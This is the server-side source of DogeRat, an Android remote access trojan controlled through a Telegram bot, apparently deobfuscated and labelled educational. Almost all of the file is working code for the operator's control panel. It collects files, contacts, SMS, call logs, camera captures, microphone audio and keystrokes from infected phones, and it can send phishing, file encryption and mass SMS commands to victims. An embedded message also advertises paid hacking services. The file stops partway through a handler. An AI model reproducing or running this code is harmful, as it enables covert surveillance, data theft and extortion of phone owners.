// DogeRat Server - Deobfuscated Version
// Remote Access Tool for Android Devices via Telegram Bot
// WARNING: This is malware. Educational purposes only.

const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const https = require("https");
const multer = require("multer");
const fs = require("fs");

// Initialize Express App
const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// Load configuration from data.json
const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));

// Initialize Telegram Bot
const bot = new telegramBot(data.token, {
  polling: true,
  request: {},
});

// Application data storage
const appData = new Map();

// Available actions for device control
const actions = [
  "✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯",
  "✯ 𝚂𝙼𝚂 ✯",
  "✯ 𝙲𝚊𝚕𝚕𝚜 ✯",
  "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯",
  "✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯",
  "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯",
  "✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯",
  "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯",
  "✯ 𝚃𝚘𝚊𝚜𝚝 ✯",
  "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯",
  "✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯",
  "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯",
  "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯",
  "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯",
  "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯",
  "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯",
  "✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯",
  "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯",
  "✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯",
  "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯",
  "✯ 𝙰𝚙𝚙𝚜 ✯",
  "✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯",
  "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯",
  "✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯",
];

// =======================
// EXPRESS ROUTES
// =======================

// File upload endpoint
app.post("/upload", uploader.single("file"), (req, res) => {
  const fileName = req.file.originalname;
  const deviceModel = req.headers.model;

  bot.sendDocument(
    data.id,
    req.file.buffer,
    {
      caption: `<b>✯ 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ${deviceModel}</b>`,
      parse_mode: "HTML",
    },
    {
      filename: fileName,
      contentType: "*/*",
    },
  );

  res.send("Done");
});

// Text data endpoint
app.get("/text", (req, res) => {
  res.send(data.commend);
});

// =======================
// SOCKET.IO CONNECTION
// =======================

io.on("connection", (socket) => {
  // Extract device information
  let deviceId =
    socket.handshake.headers.model + "-" + io.sockets.sockets.size ||
    "no information";
  let deviceModel = socket.handshake.headers.version || "no information";
  let deviceIp = socket.handshake.headers.ip || "no information";

  socket.model = deviceId;
  socket.version = deviceModel;

  // Notify admin about new device connection
  let connectionMessage =
    "<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n" +
    `<b>𝚖𝚘𝚍𝚎𝚕</b> → ${deviceId}\n` +
    `<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ${deviceModel}\n` +
    `<b>𝚒𝚙</b> → ${deviceIp}\n` +
    `<b>𝚝𝚒𝚖𝚎</b> → ${socket.handshake.time}\n\n`;

  bot.sendMessage(data.id, connectionMessage, { parse_mode: "HTML" });

  // Handle device disconnection
  socket.on("disconnect", () => {
    let disconnectionMessage =
      "<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n" +
      `<b>𝚖𝚘𝚍𝚎𝚕</b> → ${deviceId}\n` +
      `<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ${deviceModel}\n` +
      `<b>𝚒𝚙</b> → ${deviceIp}\n` +
      `<b>𝚝𝚒𝚖𝚎</b> → ${socket.handshake.time}\n\n`;

    bot.sendMessage(data.id, disconnectionMessage, { parse_mode: "HTML" });
  });

  // Handle incoming messages from device
  socket.on("message", (messageData) => {
    bot.sendMessage(
      data.id,
      `<b>✯ 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ${deviceId}\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>${messageData}`,
      { parse_mode: "HTML" },
    );
  });
});

// =======================
// TELEGRAM BOT COMMANDS
// =======================

bot.on("message", (msg) => {
  const messageText = msg.text;

  // Start command
  if (messageText === "/start") {
    const welcomeMessage =
      "<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 DOGERAT</b>\n\n" +
      "DOGERAT 𝚒𝚜 𝚊 𝚖𝚊𝚕𝚠𝚊𝚛𝚎 𝚝𝚘 𝚌𝚘𝚗𝚝𝚛𝚘𝚕 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜\n" +
      "𝙰𝚗𝚢 𝚖𝚒𝚜𝚞𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚏 𝚝𝚑𝚎 𝚙𝚎𝚛𝚜𝚘𝚗!\n\n" +
      "𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: @CYBERSHIELDX";

    bot.sendMessage(data.id, welcomeMessage, {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
        resize_keyboard: true,
      },
    });
    return;
  }

  // Handle toast text input
  if (appData.get("currentAction") === "toast") {
    let toastText = msg.text;
    let targetDevice = appData.get("currentTarget");

    if (targetDevice === "all") {
      io.sockets.emit("commend", {
        request: "toast",
        extras: [{ key: "toastText", value: toastText }],
      });
    } else {
      io.to(targetDevice).emit("commend", {
        request: "toast",
        extras: [{ key: "toastText", value: toastText }],
      });
    }

    appData.delete("currentTarget");
    appData.delete("currentAction");

    bot.sendMessage(
      data.id,
      "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true,
        },
      },
    );
    return;
  }

  // Handle text to all contacts
  if (appData.get("currentAction") === "textToAllContacts") {
    let text = msg.text;
    let targetDevice = appData.get("currentTarget");

    if (targetDevice === "all") {
      io.sockets.emit("commend", {
        request: "textToAllContacts",
        extras: [{ key: "text", value: text }],
      });
    } else {
      io.to(targetDevice).emit("commend", {
        request: "textToAllContacts",
        extras: [{ key: "text", value: text }],
      });
    }

    appData.delete("currentTarget");
    appData.delete("currentAction");

    bot.sendMessage(
      data.id,
      "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true,
        },
      },
    );
    return;
  }

  // Handle SMS number input
  if (appData.get("currentAction") === "sendSms") {
    let phoneNumber = msg.text;
    appData.set("currentNumber", phoneNumber);
    appData.set("currentAction", "smsText");

    bot.sendMessage(
      data.id,
      `<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 ${phoneNumber}</b>\n\n`,
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
          resize_keyboard: true,
          one_time_keyboard: true,
        },
      },
    );
    return;
  }

  // Handle SMS text input
  if (appData.get("currentAction") === "smsText") {
    let smsMessage = msg.text;
    let phoneNumber = appData.get("currentNumber");
    let targetDevice = appData.get("currentTarget");

    if (targetDevice === "all") {
      io.sockets.emit("commend", {
        request: "sendSms",
        extras: [
          { key: "smsNumber", value: phoneNumber },
          { key: "text", value: smsMessage },
        ],
      });
    } else {
      io.to(targetDevice).emit("commend", {
        request: "sendSms",
        extras: [
          { key: "smsNumber", value: phoneNumber },
          { key: "text", value: smsMessage },
        ],
      });
    }

    appData.delete("currentTarget");
    appData.delete("currentAction");
    appData.delete("currentNumber");

    bot.sendMessage(
      data.id,
      "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true,
        },
      },
    );
    return;
  }

  // Handle SMS to all contacts text input
  if (appData.get("currentAction") === "smsToAllContacts") {
    let smsMessage = msg.text;
    let targetDevice = appData.get("currentTarget");

    if (targetDevice === "all") {
      io.sockets.emit("commend", {
        request: "all-sms",
        extras: [{ key: "toastText", value: smsMessage }],
      });
    } else {
      io.to(targetDevice).emit("commend", {
        request: "all-sms",
        extras: [{ key: "toastText", value: smsMessage }],
      });
    }

    appData.delete("currentTarget");
    appData.delete("currentAction");

    bot.sendMessage(
      data.id,
      "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true,
        },
      },
    );
    return;
  }

  // Handle notification text input
  if (appData.get("currentAction") === "popNotification") {
    let notificationText = msg.text;
    appData.set("currentNotificationText", notificationText);

    let target = appData.get("currentTarget");
    if (target === "all") {
      io.sockets.emit("commend", {
        request: "popNotification",
        extras: [{ key: "text", value: notificationText }],
      });
    } else {
      io.to(target).emit("commend", {
        request: "popNotification",
        extras: [
          { key: "text", value: notificationText },
          { key: "notificationText", value: url },
        ],
      });
    }

    appData.delete("currentTarget");
    appData.delete("currentAction");
    appData.delete("currentNotificationText");

    bot.sendMessage(
      data.id,
      "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true,
        },
      },
    );
    return;
  }

  // Show all devices
  if (messageText === "✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯") {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n", {
        parse_mode: "HTML",
      });
    } else {
      let deviceList = `<b>✯ 𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚌𝚘𝚞𝚗𝚝 : ${io.sockets.sockets.size}</b>\n\n`;
      let deviceNumber = 1;

      io.sockets.sockets.forEach((socket, socketId, socketMap) => {
        deviceList +=
          `<b>𝙳𝚎𝚟𝚒𝚌𝚎 ${deviceNumber}</b>\n` +
          `<b>𝚖𝚘𝚍𝚎𝚕</b> → ${socket.model}\n` +
          `<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ${socket.version}\n` +
          `<b>𝚒𝚙</b> → ${socket.ip}\n` +
          `<b>𝚝𝚒𝚖𝚎</b> → ${socket.handshake.time}\n\n`;
        deviceNumber += 1;
      });

      bot.sendMessage(data.id, deviceList, { parse_mode: "HTML" });
    }
    return;
  }

  // Select All devices
  if (messageText === "✯ 𝙰𝚕𝚕 ✯") {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n", {
        parse_mode: "HTML",
      });
    } else {
      let deviceButtons = [];

      io.sockets.sockets.forEach((socket, socketId, socketMap) => {
        deviceButtons.push([socket.model]);
      });

      deviceButtons.push(["✯ 𝙰𝚕𝚕 ✯"]);
      deviceButtons.push(["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]);

      bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗</b>\n\n", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: deviceButtons,
          resize_keyboard: true,
          one_time_keyboard: true,
        },
      });
    }
    return;
  }

  // About us
  if (messageText === "✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯") {
    bot.sendMessage(
      data.id,
      "<b>✯ If you want to hire us for any paid work please contack @sphanter\n" +
        "𝚆𝚎 𝚑𝚊𝚌𝚔, 𝚆𝚎 𝚕𝚎𝚊𝚔, 𝚆𝚎 𝚖𝚊𝚔𝚎 𝚖𝚊𝚕𝚠𝚊𝚛𝚎\n\n" +
        "𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @CUBERSHIELDX\nADMIN → @SPHANTER</b>\n\n",
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true,
        },
      },
    );
    return;
  }

  // Cancel action
  if (messageText === "✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯") {
    let deviceModel = io.sockets.sockets.get(
      appData.get("currentTarget"),
    ).model;

    if (deviceModel === "all") {
      bot.sendMessage(
        data.id,
        "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"],
              ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"],
              ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"],
              ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯"],
              ["✯ 𝚃𝚘𝚊𝚜𝚝 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"],
              ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"],
              ["✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯", "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯"],
              ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"],
              ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"],
              ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"],
              ["✯ 𝙰𝚙𝚙𝚜 ✯"],
              ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"],
              ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"],
            ],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        },
      );
    } else {
      bot.sendMessage(
        data.id,
        `<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 ${deviceModel}</b>\n\n`,
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"],
              ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"],
              ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"],
              ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯"],
              ["✯ 𝚃𝚘𝚊𝚜𝚝 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"],
              ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"],
              ["✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯", "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯"],
              ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"],
              ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"],
              ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"],
              ["✯ 𝙰𝚙𝚙𝚜 ✯"],
              ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"],
              ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"],
            ],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        },
      );
    }
    return;
  }

  // Handle action buttons
  if (actions.includes(messageText)) {
    let targetDevice = appData.get("currentTarget");

    // Contacts
    if (messageText === "✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯") {
      if (targetDevice === "all") {
        io.sockets.emit("commend", { request: "contacts", extras: [] });
      } else {
        io.to(targetDevice).emit("commend", {
          request: "contacts",
          extras: [],
        });
      }
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢...</b>",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
            resize_keyboard: true,
          },
        },
      );
    }

    // SMS
    if (messageText === "✯ 𝚂𝙼𝚂 ✯") {
      if (targetDevice === "all") {
        io.to(targetDevice).emit("commend", { request: "sms", extras: [] });
      } else {
        io.sockets.emit("commend", { request: "sms", extras: [] });
      }
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢...</b>",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
            resize_keyboard: true,
          },
        },
      );
    }

    // Calls
    if (messageText === "✯ 𝙲𝚊𝚕𝚕𝚜 ✯") {
      if (targetDevice === "all") {
        io.sockets.emit("commend", { request: "calls", extras: [] });
      } else {
        io.to(targetDevice).emit("commend", { request: "calls", extras: [] });
      }
      appData.delete("currentTarget");
      bot.sendMessage(data.id, "✯ 𝙲𝚊𝚕𝚕𝚜 ✯", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          resize_keyboard: true,
        },
      });
    }

    // Gallery
    if (messageText === "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯") {
      if (targetDevice === "all") {
        io.sockets.emit("commend", { request: "gallery", extras: [] });
      } else {
        io.to(targetDevice).emit("commend", { request: "gallery", extras: [] });
      }
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢...</b>",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
            resize_keyboard: true,
          },
        },
      );
    }

    // Main Camera
    if (messageText === "✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯") {
      if (targetDevice === "all") {
        io.sockets.emit("commend", { request: "main-camera", extras: [] });
      } else {
        io.to(targetDevice).emit("commend", {
          request: "main-camera",
          extras: [],
        });
      }
      appData.delete("currentTarget");
      bot.sendMessage(
        data.id,
        "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢...</b>",
        {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚕𝚕 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
            resize_keyboard: true,
          },
        },
      );
    }

    // Selfie Camera
    if (messageText === "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯") {
      if (targetDevice === "all") {
        io.sockets.emit("commend", { request: "selfie-camera", extras: [] });
      } else {
        io.to(targetDevice).emit("commend", {
          request: "selfie-camera",
          extras: [],
        });
      }
      appData.delete("currentTarget");
      bot.sendMessage(data.id, "✯ 𝙲𝚊𝚕𝚕𝚜 ✯", {
